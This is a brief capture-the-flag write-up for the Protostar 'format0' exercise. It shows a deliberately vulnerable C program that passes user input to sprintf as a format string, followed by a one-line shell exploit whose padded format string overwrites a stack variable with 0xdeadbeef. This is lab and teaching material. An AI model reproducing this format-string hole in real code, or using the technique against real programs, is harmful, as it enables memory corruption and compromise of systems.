# **format0**
## Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

## Vulnerability
sprintf()

## Exploit
```
user@protostar:/opt/protostar/bin$ ./format0 $(python -c "print('%64d' + '\xef\xbe\xad\xde')")
you have hit the target correctly :)
```

# References
- Format specifier: https://www.cplusplus.com/reference/cstdio/printf/